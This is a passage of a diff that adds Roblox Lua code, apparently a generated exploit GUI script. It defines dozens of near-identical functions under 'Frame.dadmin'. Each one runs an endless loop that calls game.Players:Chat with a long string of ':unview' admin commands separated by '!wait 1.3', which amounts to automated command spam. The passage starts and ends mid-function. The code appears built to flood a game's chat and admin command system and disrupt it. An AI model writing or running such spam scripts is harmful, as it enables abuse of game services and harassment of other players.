+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(CZZHD_fake_script)()
+local function NMNN_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(NMNN_fake_script)()
+local function EQSLA_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(EQSLA_fake_script)()
+local function AIUQWFB_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(AIUQWFB_fake_script)()
+local function FLDRKK_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(FLDRKK_fake_script)()
+local function QYSP_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(QYSP_fake_script)()
+local function OZNXB_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(OZNXB_fake_script)()
+local function ZKVKTUF_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(ZKVKTUF_fake_script)()
+local function PJOKKUC_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(PJOKKUC_fake_script)()
+local function GWWFFV_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(GWWFFV_fake_script)()
+local function RIPCLST_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(RIPCLST_fake_script)()
+local function JHQL_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(JHQL_fake_script)()
+local function EGFTYVC_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(EGFTYVC_fake_script)()
+local function IFCGM_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(IFCGM_fake_script)()
+local function TVNP_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(TVNP_fake_script)()
+local function FRYU_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(FRYU_fake_script)()
+local function PKWEJEN_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(PKWEJEN_fake_script)()
+local function DOMH_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(DOMH_fake_script)()
+local function NJBCFCG_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(NJBCFCG_fake_script)()
+local function GFLDJCT_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(GFLDJCT_fake_script)()
+local function NSRUJ_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(NSRUJ_fake_script)()
+local function SRMEF_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(SRMEF_fake_script)()
+local function VXRVYJM_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
